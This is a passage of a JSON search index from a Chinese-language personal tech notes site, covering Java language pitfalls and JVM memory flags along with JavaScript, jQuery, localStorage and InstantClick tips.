-Xmx\u4e24\u4e2a\u53c2\u6570\u7684\u914d\u7f6e\u76f8\u540c\u7684\u503c\uff0c\u5176\u76ee\u7684\u662f\u4e3a\u4e86\u80fd\u591f\u5728java\u5783\u573e\u56de\u6536\u673a\u5236\u6e05\u7406\u5b8c\u5806\u533a\u540e\u4e0d\u9700\u8981\u91cd\u65b0\u5206\u9694\u8ba1\u7b97\u5806\u533a\u7684\u5927\u5c0f\u800c\u6d6a\u8d39\u8d44\u6e90\u3002 3\u3001-XX:newSize\uff1a\u8868\u793a\u65b0\u751f\u4ee3\u521d\u59cb\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5e94\u8be5\u5c0f\u4e8e -Xms\u7684\u503c\uff1b 4\u3001-XX:MaxnewSize\uff1a\u8868\u793a\u65b0\u751f\u4ee3\u53ef\u88ab\u5206\u914d\u7684\u5185\u5b58\u7684\u6700\u5927\u4e0a\u9650\uff1b\u5f53\u7136\u8fd9\u4e2a\u503c\u5e94\u8be5\u5c0f\u4e8e -Xmx\u7684\u503c\uff1b 5\u3001-Xmn\uff1a\u5bf9 -XX:newSize\u3001-XX:MaxnewSize\u4e24\u4e2a\u53c2\u6570\u7684\u540c\u65f6\u914d\u7f6e \u975e\u5806\u533a\u7684\uff1a 1\u3001-XX:PermSize\uff1a\u8868\u793a\u975e\u5806\u533a\u521d\u59cb\u5185\u5b58\u5206\u914d\u5927\u5c0f\uff0c\u540d\u5b57\u6765\u6e90\u4e8epermanent size 2\u3001-XX:MaxPermSize\uff1a\u8868\u793a\u5bf9\u975e\u5806\u533a\u5206\u914d\u7684\u5185\u5b58\u7684\u6700\u5927\u4e0a\u9650\u3002 \u6700\u5927\u5806\u5185\u5b58\u4e0e\u6700\u5927\u975e\u5806\u5185\u5b58\u7684\u548c\u4e0d\u80fd\u591f\u8d85\u51fa\u64cd\u4f5c\u7cfb\u7edf\u7684\u53ef\u7528\u5185\u5b58\u3002","title":"Java"},{"location":"Java/#javakeng","text":"\u8bb0\u5f55\u4e00\u4e0bJava\u4e0eC\u7684\u4e0d\u540c\u70b9\uff0c\u611f\u53d7Thinking in Java","title":"Java\u7684\u795e\u5947(keng)"},{"location":"Java/#_1","text":"$\u5c31\u662f\u4e2a\u666e\u901a\u5b57\u7b26\uff0c\u53ef\u4ee5int $a; //php\u8868\u793amdzz","title":"\u53d8\u91cf\u540d\u79f0"},{"location":"Java/#main","text":"\u5fc5\u987b\u662fpublic static void main(String[] args) \u5982\u679c\u6ca1\u6709static\uff0c\u7f16\u8bd1\u80fd\u901a\u8fc7\u4f46\u6ca1\u6709\u6267\u884c\u7ed3\u679c\uff1f// \u5f85\u8003\u8bc1\uff0ceclipse\u62d2\u7edd\u8fd0\u884c","title":"main\u51fd\u6570"},{"location":"Java/#if","text":"if\u4e2d\u7684\u4e1c\u897f\u5fc5\u987b\u662fboolean\u7c7b\u578b\u7684\u503c\uff0c\u4e0d\u80fd\u628aint\u653e\u5165if\u4e2d if ( a = true )\u7684\u5751\u8fd8\u662f\u5b58\u5728\u7684\uff0c\u5141\u8bb8\u8d4b\u503c\u4f5c\u4e3aif\u6761\u4ef6","title":"if"},{"location":"Java/#_2","text":"\u8981\u8003\u8651\u5230\u8d1f\u6570\u7684\u7ed3\u679c\u554a~\uff08\u548cC\u4e00\u81f4\uff09","title":"%\u53d6\u4f59\u7684\u7ed3\u679c"},{"location":"Java/#_3","text":"\u4e0d\u5141\u8bb8int a[5]; \u53ea\u80fdint[] a = new int [5]; \u5982\u679c\u8981\u521d\u59cb\u5316 int[] b = new int[]{1,2}; \u53ef\u4ee5\u7b80\u5316\u4e3a int c[] = {1,2}; \u4f46\u4e0d\u80fd\u51fa\u73b0d={1,2}; \u4e0d\u5141\u8bb8\u5927\u62ec\u53f7\u8fd9\u73a9\u610f\u7528\u6765\u8d4b\u503c\uff0c\u53ea\u51c6\u7528\u4e8e\u521d\u59cb\u5316","title":"\u6570\u7ec4\u58f0\u660e\u5f15\u7528\u3001\u521d\u59cb\u5316\u4e4b\u540e\u624d\u80fd\u7528"},{"location":"Java/#switch","text":"boolean\u662f\u4e0d\u884c\u7684\uff1bString\u662f\u53ef\u4ee5\u7684\uff01 case\u662f\u4e0d\u80fd\u91cd\u590d\u7684\uff08\u548cC\u4e00\u81f4\uff09","title":"switch"},{"location":"Java/#_4","text":"\u4e00\u5b9a\u662f\u6bd4\u8f83\u5730\u5740\uff0c\u5982\u679c\u201dhaha\u201d\u5728\u4ee3\u7801\u4e2d\u51fa\u73b0\u4e24\u6b21\uff0c\u4ed6\u4eec\u7684\u5730\u5740\u662f\u4e00\u6837\u7684","title":"=="},{"location":"Java/#_5","text":"int long float double \u6700\u9ad8\u51fa\u73b0\u54ea\u4e2a\u5168\u90e8\u63d0\u5347\u4e3a\u54ea\u4e2a\uff0c\u90fd\u6ca1\u6709\u5c31\u5168\u90e8\u63d0\u5347\u4e3aint \u6240\u4ee5\u8981\u8fd9\u4e48\u5199\u624d\u80fd\u628abyte 2\uff1abyte b = (byte)(a 2);","title":"\u7c7b\u578b\u81ea\u52a8\u63d0\u5347"},{"location":"Java/#_6","text":"\u52a0\u4e0astatic\u540e\uff1a\u53ef\u4ee5\u4e0d\u7528\u5b9e\u4f8b\u5316\u5916\u90e8\u7c7b\u5c31\u521b\u5efa\u5bf9\u8c61\uff0c\u4e0d\u80fd\u8bbf\u95ee\u5916\u90e8\u7c7b\u975e\u9759\u6001\u7684\u6570\u636e \u4e0d\u52a0static\uff1a\u9700\u8981\u5148\u5b9e\u4f8b\u5316\u5916\u90e8\u7c7bnew OuterClass().new InnerClass()","title":"\u5185\u90e8\u7c7b"},{"location":"Java/#new","text":"\u5bf9\u8c61\u6570\u7ec4\u7684new\u662f\u4e0d\u4f1a\u521b\u5efa\u5bf9\u8c61\u7684 \u4f8b\u5982 A[] a=new A[5]; \u5e76\u4e0d\u4f1a\u521b\u5efa5\u4e2aA\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u53ea\u662f5\u4e2a\u7a7a\u5f15\u7528","title":"\u6570\u7ec4\u7684new\u4e0d\u521b\u5efa\u5bf9\u8c61"},{"location":"Java/#_7","text":"From: http://stackoverflow.com/questions/8080649/do-i-have-to-close-fileoutputstream-which-is-wrapped-by-printstream \u5728Java7\u4e2d\u5f15\u5165\u4e86ARM(\u81ea\u52a8\u8d44\u6e90\u7ba1\u7406)\uff0c\u5e76\u4e0d\u9700\u8981\u624b\u52a8\u91ca\u653e\u8d44\u6e90 \u4ee5\u4e0b\u8fd9\u79cd\u628a\u53d8\u91cf\u58f0\u660e\u653e\u5230try\u540e\u7684\u62ec\u53f7\u91cc\u9762\uff0c\u4e0d\u5bf9\u8d44\u6e90\u624b\u52a8\u91ca\u653e\u7684\u5199\u6cd5\u662f\u53ef\u4ee5\u7684\uff0c\u6ca1\u6709\u4efb\u4f55\u9519\u8bef public static void main(String args[]) throws IOException { try (PrintStream ps = new PrintStream(new FileOutputStream(\"myfile.txt\"))) { ps.println(\"This data is written to a file:\"); System.out.println(\"Write successfully\"); } catch (IOException e) { System.err.println(\"Error in writing to file\"); throw e; } } \u666e\u901a\u7684try-catch\u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u5728finally\u4e2d\u91ca\u653e\u8d44\u6e90\uff1a public static void main ( String args [] ) throws IOException { PrintStream ps = null ; try { ps = new PrintStream(new FileOutputStream(\"myfile.txt\")) ; ps.println(\"This data is written to a file : \"); System.out.println(\" Write successfully \"); } catch (IOException e) { System.err.println(\" Error in writing to file \" ); throw e ; } finally { if (ps != null) ps.close() ; } }","title":"\u5f02\u5e38\u5904\u7406\u4e2d\u7684\u8d44\u6e90\u91ca\u653e\u95ee\u9898"},{"location":"Java/#jvm","text":"From: http://blog.chinaunix.net/uid-26863299-id-3559878.html \u5e38\u89c1\u53c2\u6570\u79cd\u7c7b\uff1a\u914d\u7f6e\u5806\u533a\u7684\uff08-Xms \u3001-Xmx\u3001-XX:newSize\u3001-XX:MaxnewSize\u3001-Xmn\uff09\u3001\u914d\u7f6e\u975e\u5806\u533a\uff08-XX:PermSize\u3001-XX:MaxPermSize\uff09\u3002 \u5806\u533a\u7684\uff1a 1\u3001-Xms \uff1a\u8868\u793ajava\u865a\u62df\u673a\u5806\u533a\u5185\u5b58\u521d\u59cb\u5185\u5b58\u5206\u914d\u7684\u5927\u5c0f 2\u3001-Xmx\uff1a \u8868\u793ajava\u865a\u62df\u673a\u5806\u533a\u5185\u5b58\u53ef\u88ab\u5206\u914d\u7684\u6700\u5927\u4e0a\u9650\uff0c\u901a\u5e38\u4f1a\u5c06 -Xms \u4e0e -Xmx\u4e24\u4e2a\u53c2\u6570\u7684\u914d\u7f6e\u76f8\u540c\u7684\u503c\uff0c\u5176\u76ee\u7684\u662f\u4e3a\u4e86\u80fd\u591f\u5728java\u5783\u573e\u56de\u6536\u673a\u5236\u6e05\u7406\u5b8c\u5806\u533a\u540e\u4e0d\u9700\u8981\u91cd\u65b0\u5206\u9694\u8ba1\u7b97\u5806\u533a\u7684\u5927\u5c0f\u800c\u6d6a\u8d39\u8d44\u6e90\u3002 3\u3001-XX:newSize\uff1a\u8868\u793a\u65b0\u751f\u4ee3\u521d\u59cb\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u5e94\u8be5\u5c0f\u4e8e -Xms\u7684\u503c\uff1b 4\u3001-XX:MaxnewSize\uff1a\u8868\u793a\u65b0\u751f\u4ee3\u53ef\u88ab\u5206\u914d\u7684\u5185\u5b58\u7684\u6700\u5927\u4e0a\u9650\uff1b\u5f53\u7136\u8fd9\u4e2a\u503c\u5e94\u8be5\u5c0f\u4e8e -Xmx\u7684\u503c\uff1b 5\u3001-Xmn\uff1a\u5bf9 -XX:newSize\u3001-XX:MaxnewSize\u4e24\u4e2a\u53c2\u6570\u7684\u540c\u65f6\u914d\u7f6e \u975e\u5806\u533a\u7684\uff1a 1\u3001-XX:PermSize\uff1a\u8868\u793a\u975e\u5806\u533a\u521d\u59cb\u5185\u5b58\u5206\u914d\u5927\u5c0f\uff0c\u540d\u5b57\u6765\u6e90\u4e8epermanent size 2\u3001-XX:MaxPermSize\uff1a\u8868\u793a\u5bf9\u975e\u5806\u533a\u5206\u914d\u7684\u5185\u5b58\u7684\u6700\u5927\u4e0a\u9650\u3002 \u6700\u5927\u5806\u5185\u5b58\u4e0e\u6700\u5927\u975e\u5806\u5185\u5b58\u7684\u548c\u4e0d\u80fd\u591f\u8d85\u51fa\u64cd\u4f5c\u7cfb\u7edf\u7684\u53ef\u7528\u5185\u5b58\u3002","title":"JVM\u542f\u52a8\u65f6\u7684\u5185\u5b58\u53c2\u6570"},{"location":"JavaScript/","text":"\u4f7f\u7528localStorage \u00b6 Cookie\u5b58\u6570\u636e\u5f71\u54cd\u8bbf\u95ee\u901f\u5ea6(\u6bcf\u6b21\u8bf7\u6c42\u90fd\u9700\u8981\u5e26\u4e0aCookie)\uff0c\u4f7f\u7528localStorage\u5b58\u50a8\u6709\u66f4\u5927\u5bb9\u91cf\uff0c\u8fd8\u4e0d\u6613\u4e22\u5931 \u5efa\u8bae\u5c06\u7528\u6237\u7684\u5927\u6bb5\u8f93\u5165\u968f\u65f6\u5b58\u50a8\u5230localStorage\u4e2d \u9ad8\u7ea7\u5e94\u7528\u53ef\u4ee5\u662f\u628ajs\u7b49\u4ee3\u7801\u6587\u4ef6\u8fd9\u6837\u7f13\u5b58\u5230\u672c\u5730\uff0c\u5b89\u5168\u6027\u8ba8\u8bba\u89c1 https://imququ.com/post/enhance-security-for-ls-code.html // \u5199\u5165 var storage = window . localStorage ; storage [ \"a\" ] = 1 ; // \u6e05\u7a7a window . localStorage . clear (); \u4f7f\u7528phantomjs\u722c\u53d6\u7f51\u9875 \u00b6 \u6709\u4e9b\u65f6\u5019\u6211\u4eec\u7528Python\u7684requests\u5e76\u4e0d\u80fd\u5f88\u5b8c\u7f8e\u5730\u6e32\u67d3\u597d\u7f51\u9875\uff0c\u4f8b\u5982\u4eba\u5bb6\u7528\u9177\u70ab\u7684js\u4f5c\u56fe\u4e86\uff0c\u6211\u5c31\u60f3\u5f97\u5230\u8fd9\u5f20\u56fe\uff0c\u8fd9\u65f6\u5019\u7528phantomjs\u5c31\u597d\u5566 \u722c\u53d6\u76ee\u6807\uff1a http://oncokb.org/#/gene/AKT1 \u8fd9\u4e2a\u7f51\u9875\u7684\u53f3\u8fb9\u6709\u4e00\u5f20Tumor Types with AKT1 Mutations\u7684\u56fe \u4ee3\u7801\uff1a code/spider.oncokb.js \u4ee3\u7801\u7684\u7ec6\u8282\uff1a \u6253\u5f00\u9875\u9762\u4e4b\u524d\u4e3a\u4e86\u622a\u56fe\u65b9\u4fbf\u9700\u8981\u5148\u8bbe\u7f6e\u6d4f\u89c8\u5668\u7684\u5927\u5c0f\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u4e3a\u4e861920*1080 \u4e0d\u8981\u4e00\u6253\u5f00\u9875\u9762\u5c31\u622a\u56fe\uff0c\u800c\u662f\u7b49\u5230\u9875\u9762\u52a0\u8f7d\u597d\u4e86\u6700\u540e\u4e00\u4e2a\u8bf7\u6c42(\u4eceChrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u67e5\u770b\u6700\u540e\u7684\u8bf7\u6c42\u662f\u5565)\u540e\uff0c\u518d\u7b49\u5f855s\u540e\u6267\u884c\u622a\u56fe\u3001\u5bfc\u51faHTML\u5e76\u9000\u51fa \u4e3a\u4e86\u9632\u6b62\u65e0\u9650\u7b49\u5f85\uff0c\u8bbe\u7f6e\u6700\u957f2min\u540etimeout\u9000\u51fa \u4e3a\u4e86\u65b9\u4fbf\u6279\u91cf\u5316\u5904\u7406\uff0c\u4ece\u547d\u4ee4\u884c\u53c2\u6570\u8bfb\u53d6\u9700\u8981\u722c\u53d6\u7684\u57fa\u56e0\u540d\u79f0 \u5728\u8fd0\u884c\u7684\u65f6\u5019\u6709\u8bbe\u7f6e\u4ee3\u7406\u548c\u4e0d\u8981\u8f7d\u5165\u56fe\u7247\u7684\u53c2\u6570\uff0c\u5177\u4f53\u89c1 \u5b98\u65b9\u6587\u6863 jQuery\u52ab\u6301show\u4e8b\u4ef6 \u00b6 \u6211\u7684\u9700\u6c42\uff1a\u7528\u6237\u767b\u5f55\u7684div\u9700\u8981\u70b9\u51fbLogin\u540e\u663e\u793a(toggle)\uff0c\u6b64\u65f6\u6d4f\u89c8\u5668\u5df2\u7ecf\u81ea\u52a8\u5e2e\u7528\u6237\u586b\u4e0a\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u7528\u6237\u9700\u8981\u624b\u52a8\u70b9\u51fb\u767b\u5f55\u6309\u94ae\u624d\u4f1a\u89e6\u53d1\u767b\u5f55\u8bf7\u6c42\uff1b\u73b0\u5728\u6211\u60f3\u52a0\u5165\u5feb\u901f\u767b\u5f55\u529f\u80fd\uff0c\u5728\u663e\u793a\u767b\u5f55div\u540e\u81ea\u52a8\u63d0\u4ea4\u767b\u5f55\u8bf7\u6c42\uff0c\u5982\u679c\u4e3a\u7a7a\u6216\u5bc6\u7801\u9519\u8bef\u518d\u4ea4\u7ed9\u7528\u6237\u8f93\u5165 \u6211\u7684\u89e3\u51b3\u65b9\u6848\uff1a\u52a0\u5165\u4e0b\u8ff0\u6269\u5c55jQuery\u7684\u4ee3\u7801\u540e\uff0c\u5bf9#login\u7ed1\u5b9abeforeShow\u4e8b\u4ef6\uff0c\u5904\u7406\u51fd\u6570\u5148\u6839\u636e\u5168\u5c40\u53d8\u91cf\u662f\u5426\u5b58\u5728\u6765\u5224\u65ad\u662f\u5426\u6267\u884c\u8fc7\uff08\u9632\u6b62\u6b7b\u5faa\u73af\uff09\uff0c\u5982\u679c\u6ca1\u6709\u6267\u884c\u8fc7\u5219\u6267\u884c\u767b\u5f55\u51fd\u6570clicklogin\u5e76\u8bbe\u7f6e\u5168\u5c40\u53d8\u91cf \u6548\u679c\uff1a\u5982\u679c\u6d4f\u89c8\u5668\u81ea\u52a8\u586b\u5165\u4e86\u6b63\u786e\u7684\u7528\u6237\u540d\u5bc6\u7801\uff0c\u5219\u7528\u6237\u70b9\u51fbLogin\u540e\u5feb\u901f\u95ea\u8fc7\u767b\u5f55\u8f93\u5165\u6846\u5373\u5b8c\u6210\u767b\u5f55\uff1b\u5982\u679c\u6d4f\u89c8\u5668\u6ca1\u6709\u81ea\u52a8\u586b\u5165\u7528\u6237\u540d\u5bc6\u7801\uff0cclicklogin\u51fd\u6570\u76f4\u63a5return\uff0c\u7528\u6237\u6ca1\u6709\u611f\u77e5\uff1b\u5982\u679c\u6d4f\u89c8\u5668\u586b\u5165\u7684\u5bc6\u7801\u662f\u9519\u7684\uff0c\u7528\u6237\u4f1a\u770b\u5230\u5bc6\u7801\u9519\u8bef\u63d0\u793a\uff0c1s\u540e\u518d\u6b21toggle\u767b\u5f55\u7684div\u8981\u6c42\u7528\u6237\u8f93\u5165 From: http://stackoverflow.com/questions/1225102/jquery-event-to-trigger-action-when-a-div-is-made-visible \u5f15\u5165jQuery\u540e\uff0c\u4fee\u6539jQuery\u81ea\u8eab\u7684show\u51fd\u6570\u4ee5\u6269\u5c55bind\uff1a jQuery ( function ( $ ) { var _oldShow = $. fn . show ; $. fn . show = function ( speed , oldCallback ) { return $ ( this ) . each ( function () { var obj = $ ( this ), newCallback = function () { if ( $. isFunction ( oldCallback )) { oldCallback . apply ( obj ); } obj . trigger ( 'afterShow' ); }; // you can trigger a before show if you want obj . trigger ( 'beforeShow' ); // now use the old function to show the element passing the new callback _oldShow . apply ( obj , [ speed , newCallback ]); }); } }); \u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528bind\u6ce8\u518c beforeShow \uff0c afterShow \u54af\uff1a jQuery(function($) { $('#test') .bind('beforeShow', function() { alert('beforeShow'); }) .bind('afterShow', function() { alert('afterShow'); }) .show(1000, function() { alert('in show callback'); }) .show(); }); \u8bfb\u53d6GET\u53c2\u6570 \u00b6 \u6709\u4e9b\u65f6\u5019\u5bf9GET\u53c2\u6570\u7684\u5904\u7406\u4ea4\u7ed9\u4e86\u524d\u7aef\uff0c\u540e\u7aef\u7684PHP\u53ef\u4ee5$_GET[\u201cparameter\u201d]\uff0c\u524d\u7aefJS\u548b\u529e\u5462\uff1f From: http://stackoverflow.com/questions/979975/how-to-get-the-value-from-the-get-parameters var QueryString = function () { // This function is anonymous , is executed immediately and // the return value is assigned to QueryString ! var query_string = {} ; var query = window . location . search . substring ( 1 ); var vars = query . split ( \"&\" ); for ( var i = 0 ; i < vars . length ; i ++ ) { var pair = vars [ i ] . split ( \"=\" ); // If first entry with this name if ( typeof query_string [ pair[0 ] ] === \"undefined\" ) { query_string [ pair[0 ] ] = decodeURIComponent ( pair [ 1 ] ); // If second entry with this name } else if ( typeof query_string [ pair[0 ] ] === \"string\" ) { var arr = [ query_string[pair[0 ] ] , decodeURIComponent ( pair [ 1 ] ) ] ; query_string [ pair[0 ] ] = arr ; // If third or later entry with this name } else { query_string [ pair[0 ] ] . push ( decodeURIComponent ( pair [ 1 ] )); } } return query_string ; } (); \u6267\u884c\u540e\u5c31\u53ef\u4ee5\u8fd9\u4e48\u4f7f\u7528\uff1a if (typeof(QueryString.parameter)!=\"undefined\") { alert(QueryString.parameter);//do something with the parameter } \u4f7f\u7528 Github Issue \u4f5c\u4e3a\u535a\u5ba2\u8bc4\u8bba\u533a \u00b6 \u4eba\u5bb6\u5927\u4f6c\u7684\u9879\u76ee\uff1a http://github.com/wzpan/comment.js \uff0c \u4e2d\u6587\u6587\u6863 \u5982\u679c\u89c9\u5f97cloudflare\u52a0\u8f7d\u901f\u5ea6\u4e0d\u4f73\uff0c\u53ef\u4ee5\u628a\u6240\u6709js\u6253\u5305\u6210\u4e00\u4e2a\u6587\u4ef6 \u6548\u679c\u5982\u672c\u535a\u5ba2\u9875\u9762\u5e95\u90e8\u8bc4\u8bba\u533a\u6240\u793a\uff0c\u4e3a\u4e86\u5077\u61d2\u5c31\u6ca1\u6709\u4e3a\u6bcf\u4e2amd\u6587\u4ef6\u5355\u72ec\u5f00issue\u4e86\uff0c\u6574\u4e2ablog\u5171\u7528\u4e00\u4e2aissue history.replaceState\u4fee\u6539\u5386\u53f2\u8bb0\u5f55 \u00b6 \u5982v2ex\u6309\u7167\u662f\u5426:visited\u6765\u533a\u5206\u70b9\u5f00\u8fc7\u548c\u6ca1\u70b9\u5f00\u8fc7\u7684\u5e16\u5b50\uff0c\u5176\u5b9e\u73b0\u662furl\u5e26\u4e0a#reply\u56de\u590d\u6570\u91cf \u4f46\u5982\u679c\u5e16\u5b50\u9875\u9762\u6709\u591a\u79cd\u8fdb\u5165\u65b9\u5f0f\uff08\u81ea\u52a8\u8df3\u8f6c\u5230\u9875\u5c3e\u3001\u53d1\u8d77\u4e86\u56de\u590d\u7b49\uff09\uff0c\u90a3\u4e48url\u5e76\u4e0d\u4e00\u5b9a\u4e0e\u9700\u8981\u7684\u4e00\u81f4 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528history API\u6765\u4fee\u6539\u5386\u53f2\u8bb0\u5f55\uff0c\u4ece\u800c\u4fdd\u8bc1\u5e26\u4e0a #reply\u56de\u590d\u6570\u91cf \u7684url\u4e00\u5b9a\u88ab\u8ba4\u4e3a\u8bbf\u95ee\u8fc7\uff1b\u800c\u4e14\u81ea\u52a8\u6539\u56de\u53bb\u7528\u6237\u65e0\u611f\u77e5\uff08\u5426\u5219\u5237\u65b0\u540e\u4f1a\u6253\u5f00\u4e0d\u4e00\u6837\u7684\u9875\u9762\uff09 \u4ee3\u7801\u5982\u4e0b\uff1a <script> setTimeout( function(){ var oldurl = location.href; history.replaceState(null, null, '/t/ {{ topic [ \"id\" ] }} #reply {{ topic [ \"replyCount\" ] }} '); history.replaceState(null, null, oldurl); }, 1000); </script> \u8bb0\u4f4f\u4e00\u4e2acheckbox\u7684\u72b6\u6001\uff08\u7528localStorage\uff09 \u00b6 \u67e5\u8be2\u662f\u5426\u52fe\u9009\u7528 .is(\":checked\") \uff0c \u6539\u53d8\u52fe\u9009\u72b6\u6001\u7528 .prop(\"checked\",true) <script> function checkbox_onclick(){ var checked = $(\"#thecheckbox\").is(\":checked\"); if(checked) localStorage.setItem(\"status_thecheckbox\",\"1\"); else localStorage.setItem(\"status_thecheckbox\",\"0\"); } </script> <input type= \"checkbox\" id= \"thecheckbox\" onclick= 'checkbox_onclick();' > <script> var status_thecheckbox = localStorage.getItem(\"status_thecheckbox\"); if(status_thecheckbox!=null && status_thecheckbox==\"1\") $(\"#thecheckbox\").prop(\"checked\",true); </script> NodeJS \u00b6 \u7528Docker\u6267\u884cnpm \u00b6 \u4f8b\u5982\u5b89\u88c5canvas\u548cgifencoder\u5305\uff1a PACKAGES = \"canvas gifencoder\" docker run -- rm -- volume = \"`pwd`:/app\" - w / app - it node : 10 npm install $ { PACKAGES } -- registry = https :// registry . npm . taobao . org \u4f7f\u7528InstantClick\u8e29\u5751 \u00b6 \u5feb\u901f\u4f7f\u7528 \u00b6 http://instantclick.io/v3.1.0/instantclick.min.js \u4e00\u5b9a\u8981\u5728\u9875\u9762\u5e95\u90e8 </body> \u4e4b\u524d\u624d\u80fd\u5f15\u5165\uff1a <script src= \"instantclick.min.js\" data-no-instant ></script> <script data-no-instant > InstantClick.init('mousedown'); </script> \u88ab\u9884\u52a0\u8f7d\u7684\u9875\u9762\u4e0d\u80fd\u8ba9\u540e\u7aef\u8fd4\u56de302 \u00b6 \u5426\u5219\u4f1a\u663e\u793a\u8df3\u8f6c\u4e4b\u524d\u7684URL \u8fd9\u79cd\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5bf9\u8fd9\u4e2a\u94fe\u63a5\u7981\u6b62\u9884\u52a0\u8f7d\uff08\u4e0d\u8fc7\u66f4\u5e94\u8be5\u8003\u8651\u8fd9\u79cd\u94fe\u63a5\u6539\u4e3apost\u8bf7\u6c42\uff09 \u5728a\u6807\u7b7e\u52a0\u4e0a data-no-instant \u6ce8\u610f\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u540e\u7aef\u5c06\u88ab\u9891\u7e41\u8bf7\u6c42 \u9891\u7387\u9650\u5236\u9700\u8981\u653e\u5bbd \u00b6 \u5b98\u7f51 \u7ed9\u51fa\u7684\u4ee3\u7801\u4f7f\u7528 InstantClick.init() \uff0c\u610f\u5473\u7740\u9f20\u6807\u79fb\u52a8\u4e0a\u53bb\u5c31\u4f1a\u89e6\u53d1\u52a0\u8f7d\uff08\u4e0d\u662f\u53ea\u89e6\u53d1\u4e00\u6b21\uff09\uff0c\u9f20\u6807\u53cd\u590d\u79fb\u52a8\u4f1a\u5bfc\u81f4\u5927\u91cf\u7684\u8bf7\u6c42 \u5982\u679c\u540e\u7aef\u505a\u4e86\u8bf7\u6c42\u9891\u7387\u9650\u5236 \u9700\u8981\u653e\u5bbd\u9650\u5236 \u8fd8\u662f\u6539\u4e3a\u7528 mousedown \u6765\u521d\u59cb\u5316 \u53ea\u6709\u7528\u6237\u786e\u5b9e\u70b9\u51fb\u4e86\u624d\u5f00\u59cb\u52a0\u8f7d \u636e\u8bf4\u4e5f\u80fd\u6709\u5f88\u597d\u7684\u6548\u679c InstantClick\u5f15\u5165\u4e00\u4e9b\u526f\u4f5c\u7528 \u5bf9\u9875\u9762js\u8981\u8fdb\u884c\u4fee\u6539 \u00b6 js\u65e0\u6cd5\u53d6\u5f97\u6b63\u786e\u7684referrer \u00b6 \u9875\u9762\u52a0\u8f7d\u7684\u8bf7\u6c42\u662fjs\u6267\u884c\u7684 document.referrer\u4e0d\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e0a\u4e00\u9875 document.addEventListener \u91cd\u590d\u89e6\u53d1 \u00b6 \u4f8b\u5982\u7ed1\u5b9apaste\u4e8b\u4ef6 \u4f60\u53ef\u80fd\u8fd9\u4e48\u5199\uff1a document.addEventListener('paste', handlepaste); \u5728\u5207\u6362\u9875\u9762\u540e \u8fd9\u4e2a\u4e8b\u4ef6\u4f1a\u591a\u6b21\u7ed1\u5b9a \u5bfc\u81f4\u591a\u6b21\u89e6\u53d1 \u6211\u7684\u505a\u6cd5\u662f\u5148\u5224\u65ad\u4e00\u4e2a\u53d8\u91cf\u662f\u5426\u5b58\u5728 \u4e0d\u5b58\u5728\u624d\u8bbe\u7f6e\uff1a if(typeof paste_registered == \"undefined\"){ document.addEventListener('paste', handlepaste); paste_registered = true; } \u4f60\u4e5f\u53ef\u4ee5\u628a\u8fd9\u4e00\u90e8\u5206 \u4e0d\u80fd\u91cd\u590d\u6267\u884c \u7684\u4ee3\u7801\u653e\u5165 <script data-no-instant> \u4e2d\uff0c\u4f46\u5982\u679c\u524d\u4e00\u9875\u6ca1\u6709\u8fd9\u4e00\u5757\u4ee3\u7801\uff08\u4e5f\u5c31\u662f\u8fd9\u4e2a\u4ee3\u7801\u662f\u5f53\u524d\u9875\u9762\u624d\u6709\u7684\uff0c\u9700\u8981\u6267\u884c\u4e00\u6b21\uff09\uff0c\u8fdb\u5165\u5f53\u524d\u9875\u9762\u662f \u4e0d\u4f1a\u89e6\u53d1 \u7684 \u8fd4\u56de\u4e0a\u4e00\u9875\u91cd\u590d\u6267\u884c\u9875\u9762\u6dfb\u52a0\u5143\u7d20\u7684js \u5bfc\u81f4\u5143\u7d20\u91cd\u590d\u51fa\u73b0 \u00b6 \u73b0\u5728\u7684\u65b9\u6cd5\u662f\u5bf9js\u52a8\u6001\u6dfb\u52a0\u7684\u5143\u7d20\u52a0\u4e2aclass \u7136\u540e\u7528jQuery\u7684remove\u65b9\u6cd5\u5148\u901a\u901a\u5220\u6389\u518d\u6dfb\u52a0 \u9875\u9762ready\u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1 \u00b6 \u9700\u8981\u52a0\u5165 InstantClick.on('change', callback); \u52a0\u5230Init\u540e\u5373\u53ef \u4f46\u662f\u4f3c\u4e4e\u8fd9\u4e2a\u4e8b\u4ef6\u89e6\u53d1\u5728\u9875\u9762\u56fe\u7247\u52a0\u8f7d\u5b8c\u6210\u4e4b\u524dOrz \u4e0d\u591f\u5b8c\u7f8e \u8d85\u94fe\u63a5\u7684#hash\u5b9a\u4f4d\u529f\u80fd\u4e5f\u9700\u8981\u81ea\u5df1\u5b9e\u73b0 \u00b6 \u9884\u52a0\u8f7d\u7684\u9875\u9762\u603b\u662f\u5b9a\u4f4d\u5230\u9876\u90e8\uff0c\u5ffd\u89c6\u5730\u5740\u680f\u4e2d\u7684 #end \u8fd9\u79cd\u5b9a\u4f4dhash \u6211\u7684\u505a\u6cd5\u662f\u8fd9\u6837\u5199\u4e0a\u8ff0onchange\u7684callback\u51fd\u6570 implement_hashjump \uff1a function has_hashjump (){ // if there is a #hash present for jumpping, return true var hash = document . location . hash . replace ( \"#\" , \"\" ); if ( ! hash ) return false ; if ( document . getElementById ( hash ) || document . getElementsByName ( hash ) . length > 0 ) return true ; else return false ; } function implement_hashjump () { if ( has_hashjump () ) { var hash = document . location . hash . replace ( \"#\" , \"\" ); if ( document . getElementById ( hash )) { document . documentElement . scrollTop = $ ( \"#\" + hash ) . offset () . top ; } else { document . documentElement . scrollTop = $ ( \"[name='\" + hash + \"']\" ) . offset () . top ; } } } \u7528\u539f\u751fJavascript\u64cd\u4f5cDOM\u8282\u70b9 The Basics of DOM Manipulation in Vanilla JavaScript \u00b6 https://www.sitepoint.com/dom-manipulation-vanilla-javascript-no-jquery/ \u9009\u62e9\u5143\u7d20 \u00b6 const myElement = document . querySelector ( '#foo > div.bar' ) myElement . matches ( 'div.bar' ) === true \u6ce8\u610fquerySelector\u662f\u7acb\u5373\u6267\u884c 